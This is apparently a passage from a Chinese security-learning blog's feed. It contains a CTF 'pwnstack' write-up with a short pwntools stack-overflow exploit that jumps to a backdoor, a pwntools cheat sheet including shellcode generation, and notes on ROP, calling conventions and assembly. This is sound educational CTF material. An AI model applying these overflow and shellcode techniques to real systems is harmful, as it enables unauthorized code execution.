        <content type="html"><![CDATA[<h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools的基本语法</title>
      <link href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>from pwn import *</p><h2 id="连接远程题目"><a href="#连接远程题目" class="headerlink" title="连接远程题目"></a>连接远程题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">809</span><span class="token punctuation">)</span> <span class="token comment">#usage:remote('host',port)</span><span class="token comment">#exp code</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#取得shell后可将commant传到terminal上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="连接本地程序"><a href="#连接本地程序" class="headerlink" title="连接本地程序"></a>连接本地程序</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./demo'</span><span class="token punctuation">)</span> <span class="token comment">#usage:process('binary',env)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span> <span class="token comment">#在tmux下可以切出视窗跑gdb</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment">#attach到gdb</span><span class="token comment">#exp code</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收一个字节</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接受一行</span>r<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token comment">#接收(num)行</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token comment">#一直接收直到碰到(str)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="send"><a href="#send" class="headerlink" title="send"></a>send</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sned<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#发送payload</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#再最后面加上空字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="pack-amp-unpack"><a href="#pack-amp-unpack" class="headerlink" title="pack&amp;unpack"></a>pack&amp;unpack</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde'</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload用flat-连接"><a href="#payload用flat-连接" class="headerlink" title="payload用flat()连接"></a>payload用flat()连接</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#b'AAAAA\xef\xbe\xad\xde'</span><span class="token comment">#在flat()函数中，不用使用b'A'的形式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="context-架构"><a href="#context-架构" class="headerlink" title="context(架构)"></a>context(架构)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'Linux'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span> <span class="token comment">#小端序</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shellcode-amp-asm"><a href="#shellcode-amp-asm" class="headerlink" title="shellcode &amp; asm"></a>shellcode &amp; asm</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>pwnlib<span class="token punctuation">.</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> fd<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#读取flag并输出，可以使用asm()包裹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#寻找elf文件中的function</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在got表的地址</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在plt表中的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">lib  <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment">#寻找libc中的function</span>lib<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token comment">#寻找system的offset</span>lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#找/bin/sh的offset</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#会产生一个空的rop链</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#打印出当前的chain</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#dump出chain在stack的样子</span>rop<span class="token punctuation">.</span>raad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#如果存在可以组成read(0,.bss+0x80)的gadgets，就加入rop chain</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#将/bin/sh字符串直接加入rop chain</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出、rop链、shellcode原理解析</title>
      <link href="/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="shellcode原理："><a href="#shellcode原理：" class="headerlink" title="shellcode原理："></a>shellcode原理：</h1><p>shellcode通常使用机器语言编写，是一段用于利用软件漏洞而执行的代码其目的常常让攻击者获得目标机器的命令行shell而得名。<br>shellcode根据他是攻击者控制他所运行的机器，还是通过网络控制另一台机器，可以分为本地和远程两种类型有时攻击者注入目标进程中的字节数是被限制的，因此可以将shellcode分阶段进行，由前一阶段比较简短的shellcode将后一阶段比较复杂的shellcode下载并执行。</p><h1 id="栈溢出原理："><a href="#栈溢出原理：" class="headerlink" title="栈溢出原理："></a>栈溢出原理：</h1><p>由于C语言对数组引用不做任何边界的检查，从而导致缓冲区溢出（<em>buffer overflow</em>）成为一种常见的漏洞。根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。由于栈上保存着局部变量和一些状态信息，一旦发生严重的溢出，攻击者就可以通过复盖返回地址来执行任意代码，利用方法包括shellcode注入、ret2libc、rop等。<br>在之前的博客中有提到，<strong>函数以栈的形式调用</strong>，在每个栈的底部有rbp指针和我们的返回地址，如果溢出<strong>足够多</strong>的字节，就可以将rbp指针和返回地址给<strong>覆盖</strong>，当函数执行到返回地址时就可以按照我们所设计好的地址<strong>跳跃</strong>到目标函数继续执行获得shell。</p><h1 id="rop链原理："><a href="#rop链原理：" class="headerlink" title="rop链原理："></a>rop链原理：</h1><p>对于rop原理我学得磕磕碰碰，（老师讲得有点模糊）主要是一个地方没讲好，希望后来人别被卡住。<br>最开始要利用栈溢出，只需要将返回地址覆盖为jmp esp的指令地址，并在后面添加shellcode就可以执行 后来引入了NX缓解机制，数据的所在内存页被标记为不可执行此时再执行shellcode就会抛出异常，所以注入新的代码并不可行，那么就复用程序中已有的代码。<br>于是rop链技术就诞生了使用rop链就要先扫描文件，提取出可用的gadget片段（通常以ret指令结尾）<strong>的地址</strong>（划重点），然后将这些gadget根据需要的功能进行组合达到攻击者的目的（刚开始老师没讲清楚是<strong>地址</strong>，导致我一直在自己猜想怎么拼接的）。<br>这里附一张图更好理解：<br><img src="/images/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.webp" alt="1"><br>也就是覆盖返回地址为gadget的地址，跳到gadget片段上执行在此gadget的地址下附上另一个gadget的地址，以此类推连成rop链。<br>如图pop rdi完rsp向下跳一格，并继续执行return指令实现&#x2F;bin&#x2F;sh_的函数调用获取shell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数的调用和约定</title>
      <link href="/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/"/>
      <url>/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h2><h4 id="计算机内部的数据存储形式"><a href="#计算机内部的数据存储形式" class="headerlink" title="计算机内部的数据存储形式"></a>计算机内部的数据存储形式</h4><p>计算机内部有两种存储形式，分为大端序、小端序。</p><h6 id="大端序："><a href="#大端序：" class="headerlink" title="大端序："></a>大端序：</h6><p>以0123456789abcdef为例，数据最高位01存储在低位，最低位ef存储在高位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/1.png"><br>将此数据按照字符串输出，得到的为：\x01\x23\x45\x67\x89\xab\xcd\xef</p><h6 id="小端序："><a href="#小端序：" class="headerlink" title="小端序："></a>小端序：</h6><p>一0123456789abcdef为例，数据最高位01存储在高位，最低位ef存储在低位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/2.png"><br>将此数据按照字符串输出，得到的为：\xef\xcd\xab\x89\67\x45\x23\x01</p><h6 id="两种方式比较"><a href="#两种方式比较" class="headerlink" title="两种方式比较"></a>两种方式比较</h6><p>从输出结果来看，大端序符合人类阅读习惯。<br>从存储逻辑、数学运算规律，小端序更正常。<br>总结为<strong>“大端序：高低低高，小端序：高高低低”</strong><br>对于linux而言，是以小端序存储，所以我们以字符串的形式输入一个数字时，要注意格式。<br>比如输入0xdeadbeef这个字符串，输入就是”\xef\xbe\xad\xde”传入程序。<br>但我们有pwntools，p32即可完成自动转换。</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p>linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返<br>回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来<br>指向被打开的文件，所有的i&#x2F;o操作的系统调用都会通过文件描述符。<br>每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件。<br>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。</p><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈是一种LIFO（先进后出）的数据结构。栈的基本操作有两种：<strong>push（压栈）</strong>和<strong>pop（弹栈）</strong>。<br>由于函数的调用顺序也是LIFO，所以绝大多数系统都是通过栈这一数据结构来维护函数调用关系的。<br>在Linux系统中，系统为每一个进程都安排了一个栈，进程中每一个调用的函数都有自己独立的栈帧。<br><strong>栈是由高地址向低地址生长的。高地址为栈底，低地址为栈顶。</strong><br>很多算法都是用栈实现的。以递归的形式实现一些算法在本质上来说也是利用栈结构。只不过没有在程序<br>中另外申请一个栈，而是利用函数调用栈。</p><h4 id="函数的调用流程"><a href="#函数的调用流程" class="headerlink" title="函数的调用流程"></a>函数的调用流程</h4><p>以一下代码为例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//do sth.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main函数调用func_b,func_b调用func_a。<br>我们从main函数开始，逐步分析栈帧变化。<br>当运行到call func_b时main函数的栈帧如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/3.png"><br>rbp指向栈底，rsp指向栈顶，这些栈帧存放了一些main的局部变量。<br>main函数要调用func_b，main只要call func_b，也就是</p><pre class="line-numbers language-none"><code class="language-none">push rip；mov rip func_b；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当然被调用的函数还要维护栈帧。（用rsp与rbp开辟空间）</strong><br>如下</p><pre class="line-numbers language-none"><code class="language-none">push rbp;  &#x2F;*将调用函数的栈底指针保存*&#x2F;mov rbp rsp;  &#x2F;*将栈底指针指向现在的栈顶*&#x2F;sub rsp xxx;  &#x2F;*开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>同理根据以上步骤调用func_a也是一样的<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/5.png"><br>在函数执行结束后返回时，会执行leave；ret；<br>也就是：</p><pre class="line-numbers language-none"><code class="language-none">mov rsp rbp；&#x2F;*将栈顶指针指向栈底*&#x2F;pop rbp；&#x2F;*将栈底指针弹出*&#x2F;（其实就是改变rsp的值个人认为）pop rip；&#x2F;*将fun_b的下一行地址弹出到rip*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>栈布局如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>直到结束函数释放栈空间。<br>总结如下：<br><strong>调用函数：将rip压栈，然后将rip赋值为被调用函数的起始地址。这一操作被隐性地内置在call指令中。</strong><br><strong>被调用函数：先保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间自用，此时rbp就成了被调用函数的栈底。</strong><br><strong>函数返回：恢复栈帧，返回调用函数的返回地址。</strong></p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>一般来说，一个函数的返回值会存储到<strong>rax寄存器</strong>。<br>x86-64下函数的调用约定为：<br>从左至右参数依次传递给<strong>rdi，rsi，rdx，rcx，r8，r9</strong>。<br>如果一个函数的参数大于六个，则<strong>从右至左</strong>压入栈中传递。（因为栈LIFO）<br>syscall指令用于调用系统函数，调用时需要指明系统调用号。系统调用号存在rax寄存器中。之后布置好参数，执行syscall即可。<br>系统调用的常用调用号码如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/6.png"><br>如调用read（0，buf，size）：</p><pre class="line-numbers language-none"><code class="language-none">mov rax,0    &#x2F;*read&#39;s syscall number.*&#x2F;mov rdi,0    &#x2F;*first arg*&#x2F;mov rsi,buf   &#x2F;*second arg.*&#x2F;mov rdx,size  &#x2F;*third arg.*&#x2F;syscall    &#x2F;*excute read(0,buf,size)*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令小结</title>
      <link href="/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一-算术运算指令"><a href="#一-算术运算指令" class="headerlink" title="一.算术运算指令"></a>一.算术运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>add</td><td>add ax,bx</td><td>将bx+ax的值储存在ax中</td></tr><tr><td>sub</td><td>sub ax,bx</td><td>将ax-bx的值存在ax中</td></tr><tr><td>inc</td><td>inc bx</td><td>将bx的值加1,不影响flag寄存器相关位置</td></tr><tr><td>dec</td><td>dec bx</td><td>将bx的值减1，……</td></tr><tr><td>mul</td><td>mul ax,bx</td><td>将ax*bx的值存在ax中，如果是32位乘法则要将高位字节储存与dx中，低位储存于ax中,16位大差不差</td></tr><tr><td>div</td><td>div ax,bx</td><td>ax&#x2F;bx的值储存于ax……</td></tr><tr><td>adc</td><td>adc ah,bh</td><td>(ah）&#x3D;（bh）+（ah）+ CF</td></tr><tr><td>sbb</td><td>sbb ax,bx</td><td>（ax）&#x3D;（ax）-（bx）- CF</td></tr><tr><td>cmp</td><td>cmp ax,bx</td><td>将ax-bx但不储存在任何地方只影响flag寄存器的相关位置，用于判断两数大小</td></tr></tbody></table><h2 id="二-逻辑运算指令"><a href="#二-逻辑运算指令" class="headerlink" title="二.逻辑运算指令"></a>二.逻辑运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>and</td><td>and ax,bx</td><td>用于定向更改二进制数的某位，如字母的大小写变换，只有两边同为1时结果为1</td></tr><tr><td>or</td><td>or ax,bx</td><td>只有两边都为0时结果为0，其它为1</td></tr><tr><td>xor</td><td>xor ax,bx</td><td>同为1或0结果为0或者为1</td></tr><tr><td>not</td><td>not al</td><td>取al值的反码</td></tr></tbody></table><h2 id="三-目的地址传送指令"><a href="#三-目的地址传送指令" class="headerlink" title="三.目的地址传送指令"></a>三.目的地址传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>lea</td><td>lea bx,dx:[98H]</td><td>把偏移地址存到bx，相当于C语言中的&amp;符号</td></tr><tr><td>lds</td><td>lds si,string</td><td>把段地址：偏移地址存到ds:si中</td></tr><tr><td>les，lfs，lgs，lss</td><td>……</td><td>……</td></tr></tbody></table><h2 id="四-通用数据传送指令"><a href="#四-通用数据传送指令" class="headerlink" title="四.通用数据传送指令"></a>四.通用数据传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>mov</td><td>mov ax,bx</td><td>将bx中的数据覆盖到ax中</td></tr><tr><td>push</td><td>push ax</td><td>将ax中的值压入栈中</td></tr><tr><td>pop</td><td>pop ax</td><td>将栈中的值取出进ax中</td></tr></tbody></table><h2 id="五-程序转移指令（长转移）"><a href="#五-程序转移指令（长转移）" class="headerlink" title="五.程序转移指令（长转移）"></a>五.程序转移指令（长转移）</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>jmp</td><td>jmp ax,bx</td><td>无条件跳转指令，根据偏移量进行跳转</td></tr><tr><td>call</td><td>call s</td><td>将当前地址推入栈中，并跳转到s处</td></tr><tr><td>ret</td><td>ret</td><td>将栈中地址弹出至ds：ip并跳转</td></tr></tbody></table><h4 id="条件转移指令（短转移）"><a href="#条件转移指令（短转移）" class="headerlink" title="条件转移指令（短转移）"></a>条件转移指令（短转移）</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>je&#x2F;jz</td><td>je&#x2F;jz s</td><td>若相等则跳转</td></tr><tr><td>jne&#x2F;jnz</td><td>……</td><td>若不相等则跳转</td></tr><tr><td>jb&#x2F;jl</td><td>……</td><td>若小于则跳转</td></tr><tr><td>ja&#x2F;jg</td><td>……</td><td>若大于则跳转</td></tr><tr><td>jge</td><td>……</td><td>若大于等于则跳转</td></tr><tr><td>jle</td><td>……</td><td>若小于等于则跳转</td></tr></tbody></table><h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>loop</td><td>loop s</td><td>消耗cx中的值，并跳转至s处</td></tr><tr><td>jcxz</td><td>jcxz s</td><td>当cx中值为0时跳转至s</td></tr><tr><td>jecxz</td><td>……</td><td>……</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析jmp指令的原理</title>
      <link href="/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>搭建博客以来一直很少更新，从这篇开始会加快更新进度。<br>以下是对《汇编语言》中的八实验的解析：</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:codesgcodesg segment                             mov ax,4c00h               int 21h       start:        mov ax,0                             s:      nop                       nop                       mov di,offset s                       mov si,offset s2                       mov ax,cs:[si]                       mov cs:[di],ax                           s0:        jmp short s                             s1:        mov ax,0                                               int 21h                       mov ax,0                                     s2:     jmp short s1                       nop       codesg ends       end start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>通过代码解读:它首先用offset指令取s的地址存在di中，后取s2的地址存在si中通过mov ax,cs[si]与 mov cs:[di],ax<br>将s2地址的储存单元中的指令搬到了s地址的储存单元中并执行，执行后应该跳到s1处进入死循环。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>实际却非如此：</p><p>一.先对内存空间进行查看：<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/1.png" alt="1"><br>二.单步进行输入“t”查看运行<br><img 